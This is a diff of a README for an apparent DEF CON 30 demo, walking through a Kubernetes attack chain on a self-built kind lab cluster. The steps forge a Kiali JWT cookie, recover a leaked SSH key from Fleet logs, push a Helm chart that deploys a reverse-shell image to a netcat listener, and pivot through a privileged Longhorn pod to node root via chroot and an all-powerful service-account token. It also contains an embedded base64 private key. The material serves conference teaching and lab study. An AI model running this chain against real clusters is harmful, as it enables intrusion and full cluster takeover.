@@ -1,154 +1,30 @@
 # DEF CON 30 - The Call Is Coming From Inside the Cluster
 
+My sincere hope is that this walkthrough makes it incredibly easy for anyone interested in recreating the attack from our demo to do just that. I'm sure there is some step I either left out or did not fully document, so if you get stuck, please feel free to open an issue on the GitHub project. I'll do my best to respond promptly.
+
 ## Setup
 
 ### Prerequisites
 
 - [istioctl v1.4.6](https://github.com/istio/istio/releases/tag/1.4.6)
+- [docker](https://docs.docker.com/get-docker/)
+- [kind](https://kind.sigs.k8s.io/docs/user/quick-start/#installation)
+- [kubectl](https://kubernetes.io/docs/tasks/tools/#kubectl)
+- [helm](https://helm.sh/docs/intro/install/)
 
-### Steps
+Also, you'll need to clone the Longhorn exploit package and build the Docker image. As long as the Docker image is locally available, the Makefile will take care of loading it into the demo cluster.
+1. Clone git@github.com:dagan/rustler.git
+2. Run ```make raider```
 
-#### Initial Cluster + Istio
+### Make
 
- 1. Build a kind image that includes open-iscsi (a Longhorn dependency)
-    ```shell
-    docker build -t defcon30/kind:pwnership .
-    ```
+The included Makefile creates a fully functional demo cluster for you to attack. It was written for *nix and MacOS systems. For Windows, you'll need to perform the steps manually (sorry!).
 
- 2. Create a kind cluster
-    ```shell
-    cat <<EOF | kind create cluster --image=defcon30/kind:pwnership --name pwnership --config -
-    kind: Cluster
-    apiVersion: kind.x-k8s.io/v1alpha4
-    nodes:
-    - role: control-plane
-    - role: worker
-      extraPortMappings:
-      - containerPort: 31080
-        hostPort: 8080
-        listenAddress: "127.0.0.1"
-        protocol: TCP
-      - containerPort: 31022
-        hostPort: 2222
-        listenAddress: "127.0.0.1"
-        protocol: TCP
-    EOF
-    ```
- 3. Install Istio
-    ```shell
-    istioctl manifest apply --set values.kiali.enabled=true --set values.gateways.istio-ingressgateway.type=NodePort
-    ```
- 4. Edit the Ingress Gateway, set http2 NodePort to 31080
-    ```shell
-    kubectl -n istio-system edit svc/istio-ingressgateway
-    ```
- 5. Create a random secret for Kiali
-    ```shell
-    kubectl -n istio-system create secret generic kiali --from-literal=username=kiali --from-literal=passphrase=$(openssl rand -base64 12)
-    ```
- 6. Add a Virtual Service for Kiali
-    ```shell
-    cat <<EOF |kubectl -n istio-system apply -f -
-    apiVersion: networking.istio.io/v1alpha3
-    kind: VirtualService
-    metadata:
-      name: kiali-virtual-service
-    spec:
-      hosts:
-      - "*"
-      gateways:
-      - ingressgateway
-      http:
-        - match:
-          - uri:
-             prefix: /kiali 
-          route:
-          - destination:
-              host: kiali
-    EOF
-    ```
-
-### Install Longhorn
-
- 1. Install the Helm chart
-    ```shell
-    helm -n longhorn-system install --create-namespace longhorn https://github.com/longhorn/charts/releases/download/longhorn-1.2.2/longhorn-1.2.2.tgz \
-      --set persistence.defaultClass=false
-    ```
-
-#### Install Gitea
-
-1. Create the gitops namespace and admin credentials.
-   ```shell
-   kubectl create ns gitops
-   kubectl -n gitops create secret generic git-admin --from-literal=username=git-admin --from-literal=password=supersecret
-   helm -n gitops install gitea https://dl.gitea.io/charts/gitea-5.0.9.tgz \
-     --set gitea.admin.existingSecret=git-admin \
-     --set gitea.config.server.ROOT_URL=http://localhost:8080/gitea/ \
-     --set gitea.config.server.DOMAIN=localhost \
-     --set gitea.config.server.SSH_DOMAIN=localhost \
-     --set gitea.config.server.SSH_PORT=2222 \
-     --set service.ssh.type=NodePort \
-     --set service.ssh.nodePort=31022
-   ```
-2. Create the Gitea Virtual Service
-   ```shell
-   cat <<EOF |kubectl -n gitops apply -f -
-   apiVersion: networking.istio.io/v1alpha3
-   kind: VirtualService
-   metadata:
-     name: gitea-virtual-service
-   spec:
-     hosts:
-     - "*"
-     gateways:
-     - istio-system/ingressgateway
-     http:
-       - match:
-         - uri:
-             exact: /gitea
-         redirect:
-           uri: /gitea/
-       - match:
-         - uri:
-             prefix: /gitea/
-         rewrite:
-           uri: /
-         route:
-         - destination:
-             host: gitea-http
-   EOF
-   ```
-3. Create the gitops user and add an SSH public key.
-   ```
-   ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN6HY7lDW2kSd0V6J/I8PZEG9bYGkl0oXYqowJIjyPxDvnezbfc2fgQiZscb03ySihdMaxtSWJcer93suyYKShM=
-   ```
-4. Create the ```fleet``` repo.
-5. Create the ```my-app``` repo.
-
-#### Install Fleet
-1. Create the ```fleet-local``` namespace and add the SSH key Secret.
-   ```shell
-   kubectl create ns fleet-local
-   cat <<EOF |kubectl -n fleet-local apply -f -
-   apiVersion: v1
-   kind: Secret
-   metadata:
-     name: gitops-ssh-key
-   type: kubernetes.io/ssh-auth
-   data:
-     ssh-privatekey: LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFhQUFBQUJObFkyUnpZUwoxemFHRXlMVzVwYzNSd01qVTJBQUFBQ0c1cGMzUndNalUyQUFBQVFRVGVoMk81UTF0cEVuZEZlaWZ5UEQyUkJ2VzJCcEpkCktGMktxTUNTSThqOFE3NTNzMjMzTm40RUltYkhHOU44a29vWFRHc2JVbGlYSHEvZDdMc21Da29UQUFBQW9EOGEwMVkvR3QKTldBQUFBRTJWalpITmhMWE5vWVRJdGJtbHpkSEF5TlRZQUFBQUlibWx6ZEhBeU5UWUFBQUJCQk42SFk3bERXMmtTZDBWNgpKL0k4UFpFRzliWUdrbDBvWFlxb3dKSWp5UHhEdm5lemJmYzJmZ1FpWnNjYjAzeVNpaGRNYXh0U1dKY2VyOTNzdXlZS1NoCk1BQUFBaEFOZTlpQmdtSzFGTGw2YzdhS3BEU0tXNFNYeWVTOWwyenRmQXZoZmdad2xkQUFBQUFBRUNBd1FGQmdjPQotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K
-     ssh-publickey: ZWNkc2Etc2hhMi1uaXN0cDI1NiBBQUFBRTJWalpITmhMWE5vWVRJdGJtbHpkSEF5TlRZQUFBQUlibWx6ZEhBeU5UWUFBQUJCQk42SFk3bERXMmtTZDBWNkovSThQWkVHOWJZR2tsMG9YWXFvd0pJanlQeER2bmV6YmZjMmZnUWlac2NiMDN5U2loZE1heHRTV0pjZXI5M3N1eVlLU2hNPSAK
-   EOF
-   ```
-2. Install Fleet
-   ```shell
-   helm -n fleet-system install --wait fleet-crd https://github.com/rancher/fleet/releases/download/v0.3.8/fleet-crd-0.3.8.tgz --create-namespace
-   helm -n fleet-system install fleet https://github.com/rancher/fleet/releases/download/v0.3.8/fleet-0.3.8.tgz \
-     --set bootstrap.repo=git@gitea-ssh.gitops:gitops/fleet.git \
-     --set bootstrap.secret=gitops-ssh-key \
-     --set bootstrap.branch=main
-   ```
+The Makefile will:
+ - Stand up a kind cluster with Longhorn dependencies preloaded in the node
+ - Install Longhorn, Istio, Kiali, and Fleet
+ - Create a CronJob to simulate active GitOps-based cluster management
+ - Preload the exploit image into the cluster (this is only necessary because the exploit image is not published to a public registry)
 
 ## Walkthrough
 
@@ -163,24 +39,29 @@
    eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2NTc1NzA0MzQsImlzcyI6ImtpYWxpLWxvZ2luIiwic3ViIjoiRXZpbCBEYWdhbiJ9.XYvyZLlKOrI_vj5w6xjvw_PdFp3oyu_mzF5omwSTzxg
    ```
 2. Visit http://localhost:8080/kiali/console.
-3. Using developer tools, add a cookie named "kiali-token" and set a the value to be the JWT created in step 2.
+3. Using your browser's developer tools/console, add a cookie named "kiali-token" and set the value to be the JWT created in step 2.
 4. Reload the page.
+5. You're in.
+
+### Fleet
+
+1. With Kiali, take look at the logs of the fleet-agent workload in the fleet-system namespace.
+2. Look for an error message like this:
+ > 2022-08-12T14:39:01.809864780Z time="2022-08-12T14:39:01Z" level=error msg="bundle bootstrap: gitrepo.fleet.cattle.io fleet-local/control error] time=\"2022-08-12T14:38:20Z\" level=info msg=\"updated: fleet-local/control\\n\"\ntime=\"2022-08-12T14:38:21Z\" level=fatal msg=\"error downloading 'ssh://git@gitea-ssh.gitops/gitops/vitruvian.git?ref=develop&sshkey=LS0tLS1CRU...
+3. I removed most of the SSH key from the log snippet above, but the actual error message includes the entire base64-encoded private SSH key. Decode it and save it to local file.
+4. There is also a complete GIT URL for the erring repository. To simplify the demo environment, Gitea is running in the same cluster as Fleet, so this URL only works inside the cluster. However, the same SSH service can be reached at localhost:2222, so replace ```gitea-ssh.gitpos``` with ```loalhost:2222``` and then clone the repository. (In a real-world scenario, Fleet would most likely be pulling from a remote Git repository and the URL would not need to be modified.)
+5. Note that while Fleet is looking a ```develop``` branch, the only branch in the repository is ```main```. To run the exploit, you'll need to:
+   1. Create and checkout a ```develop``` branch.
+   2. Start netcat listening on a chosen port (the demo uses 12345)
+   3. Modify the Helm chart to deploy dagan/rustler:raider and provide your system's LAN IP (localhost will _not_ work) and chosen netcat port as the arguments.]
+   4. Commit your changes and push the ```develop``` branch.
+6. As soon as Fleet picks up your changes and deploys them, your exploit payload should connect to netcat and provide you a remote shell.
 
 ### Longhorn
 
- 1. Drop the payload as a job
-    ```yaml
-    apiVersion: batch/v1
-    kind: Job
-    metadata:
-      name: pi-with-ttl
-    spec:
-      ttlSecondsAfterFinished: 100
-      template:
-        spec:
-          containers:
-          - name: raider
-            image: dagan/rustler:raider
-            command: ["192.168.50.215", "12345"]
-          restartPolicy: Never
-    ```
+1. From your remote shell, run ifconfig to determine the pod's CIDR block. Then run nmap to find Longhorn manager pods (they listen on port 8500).
+2. Start a second netcat listener on a different port (the demo uses 12346).
+3. From your remote shell, execute rustle to get the second reverse shell. (The longhorn base image is Ubuntu, so bash is available.)
+4. Your second reverse shell provides root access on the Longhorn pod, which is _very_ privileged.
+5. The host's (node's) ```/proc``` and ```/dev``` filesystems are mounted in the Longhorn pod at ```/host/proc``` and ```/host/dev```, respectively. Using chroot, change your session's root to ```/host/proc/1/root```.
+6. You are now running as root on the node. ```crictl``` works, and if you dig around in the containers to find either longhorn-manager or fleet-agent, you can get a Service Account token that has "*, *, *" permissions.
